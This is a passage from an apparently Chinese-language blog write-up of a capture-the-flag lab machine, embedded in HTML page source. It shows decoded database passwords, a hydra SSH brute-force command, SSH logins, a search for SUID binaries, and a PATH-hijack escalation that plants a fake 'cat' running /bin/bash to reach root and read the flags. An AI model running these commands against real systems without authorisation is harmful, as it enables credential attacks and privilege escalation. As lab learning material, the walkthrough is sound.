+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span><span style="color:#ff7b72">select</span> * from login;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>+------+---------+--------------------------+
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>| id   | user_id | password                 |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>+------+---------+--------------------------+
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>|    <span style="color:#a5d6ff">1</span> |       <span style="color:#a5d6ff">2</span> | <span style="color:#79c0ff">c3VSSkFkR3dMcDhkeTNyRg</span><span style="color:#ff7b72;font-weight:bold">==</span> |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>|    <span style="color:#a5d6ff">2</span> |       <span style="color:#a5d6ff">4</span> | <span style="color:#79c0ff">N1p3VjRxdGc0MmNtVVhHWA</span><span style="color:#ff7b72;font-weight:bold">==</span> |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>|    <span style="color:#a5d6ff">3</span> |       <span style="color:#a5d6ff">1</span> | <span style="color:#79c0ff">WDdNUWtQM1cyOWZld0hkQw</span><span style="color:#ff7b72;font-weight:bold">==</span> |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span>|    <span style="color:#a5d6ff">4</span> |       <span style="color:#a5d6ff">3</span> | <span style="color:#79c0ff">REpjZVZ5OThXMjhZN3dMZw</span><span style="color:#ff7b72;font-weight:bold">==</span> |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span>|    <span style="color:#a5d6ff">5</span> |       <span style="color:#a5d6ff">5</span> | <span style="color:#79c0ff">Y3FObkJXQ0J5UzJEdUpTeQ</span><span style="color:#ff7b72;font-weight:bold">==</span> |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span>+------+---------+--------------------------+</span></span></code></pre></div><p>获得的密码是base64加密，经过解密
+suRJAdGwLp8dy3rF
+7ZwV4qtg42cmUXGX
+X7MQkP3W29fewHdC
+DJceVy98W28Y7wLg
+cqNnBWCByS2DuJSy
+（这里username开头<strong>小写</strong>，不然没结果）
+接着创建<code>username.txt</code>、<code>passwd.txt</code>两个文件，分别将信息输入（一行一个），用hydra爆破<code>hydra -L username.txt -P passwd.txt ssh://192.168.203.131</code>，获得两个有用的账户和密码，travis；DJceVy98W28Y7wLg，dexter；7ZwV4qtg42cmUXGX</p>
+<p>利用账户密码，用ssh尝试登录，<code>ssh travis@192.168.203.131</code>，进入后获得如下信息：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>travis@debian:~$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>user.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>travis@debian:~$ cat user.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>ICA<span style="color:#ff7b72;font-weight:bold">{</span>Secret_Project<span style="color:#ff7b72;font-weight:bold">}</span></span></span></code></pre></div><p><code>ssh dexter@192.168.203.131</code>，进入后获得如下信息：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>dexter@debian:~$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>note.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>dexter@debian:~$ cat note.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>It seems to me that there is a weakness <span style="color:#ff7b72">while</span> accessing the system.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>As far as I know, the contents of executable files are partially viewable.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>I need to find out <span style="color:#ff7b72">if</span> there is a vulnerability or not.</span></span></code></pre></div><h2 id="四提权">四、提权<a class="anchor" href="#%e5%9b%9b%e6%8f%90%e6%9d%83">#</a></h2>
+<p>根据提示，和可执行文件有关，查看具有root权限的可执行文件有哪些</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>dexter@debian:~$ cd ./
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>dexter@debian:/home/dexter$ find / -perm -4000 -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>/opt/get_access
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>/usr/bin/umount
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>/usr/bin/su
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span></span></code></pre></div><p>而第一个/opt/get_access文件很可疑，<code>strings</code>出来一个cat命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>dexter@debian:/home/dexter$ cd /opt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>dexter@debian:/opt$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>get_access
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>dexter@debian:/opt$ strings get_access
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>/lib64/ld-linux-x86-64.so.2
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>setuid
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>......（省略）
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">8</span><span>cat /root/system.info
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">9</span><span>......（省略） </span></span></code></pre></div><p>而直接运行<code>cat</code>失效，由于<code>/root/system.info</code>存放在root的家目录下。在Linux中，普通用户（如<code>dexter</code>）没有读取root文件的权限。
+而从输出中看到两个信息：</p>
+<ol>
+<li><code>setuid</code>说明程序有<strong>SUID权限</strong>，当运行时，会临时获得root身份</li>
+<li><code>cat /root/system.info</code>，调用了<code>cat</code>，且没有写绝对路径（写的是<code>cat</code>，而不是<code>/bin/cat</code>）</li>
+<li>漏洞在于：当程序只写<code>cat</code>时，会根据系统<code>PATH</code>环境变量挨个文件夹找哪里有叫<code>cat</code>的程序</li>
+</ol>
+<p>接着自己编写一个cat命令写入环境，让其引用我们的cat命令。
+先在<code>/tmp</code>目录下创建一个名为<code>cat</code>的文件，但它的内容是启动Bash Shell的指令，再给假的cat权限，修改PATH，先让系统找假cat，最后运行<code>/opt</code>下的<code>get_access</code>文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>echo <span style="color:#a5d6ff">&#39;/bin/bash&#39;</span> <span style="color:#ff7b72;font-weight:bold">&gt;</span> <span style="color:#ff7b72;font-weight:bold">/</span>tmp<span style="color:#ff7b72;font-weight:bold">/</span>cat
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>chmod <span style="color:#ff7b72;font-weight:bold">+</span>x <span style="color:#ff7b72;font-weight:bold">/</span>tmp<span style="color:#ff7b72;font-weight:bold">/</span>cat
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span><span style="color:#ff7b72">export</span> PATH<span style="color:#ff7b72;font-weight:bold">=/</span>tmp:<span style="color:#ff7b72;font-weight:bold">$</span>PATH
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span><span style="color:#ff7b72;font-weight:bold">/</span>opt<span style="color:#ff7b72;font-weight:bold">/</span>get_access</span></span></code></pre></div><p>成功获得root权限！</p>
+<p>由于改变了cat命令，这个时候使用<code>vim root.txt</code>查看文件内容或者删除<code>/tmp/cat</code>文件，然后<code>cat root.txt</code>查看文件内容，成功获得flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>root@debian:/root# cd /tmp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>root@debian:/tmp# rm cat
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>root@debian:/tmp# ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>systemd-private-0fa7ab6b0e2b4030b0b2e8cb9a2bece0-apache2.service-UBSkmg
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>systemd-private-0fa7ab6b0e2b4030b0b2e8cb9a2bece0-systemd-logind.service-MKPw9i
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>systemd-private-0fa7ab6b0e2b4030b0b2e8cb9a2bece0-systemd-timesyncd.service-WEHXpj
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>root@debian:/tmp# cat /root/root.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">8</span><span>ICA{Next_Generation_Self_Renewable_Genetics}</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <footer class="custom-footer">
+  <span class="status-dot"></span>
+  <span>2026 vnccer <a href="https://creativecommons.org/licenses/by/4.0/" target="_blank" class="license-link">CC BY 4.0</a></span>
+</footer>
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
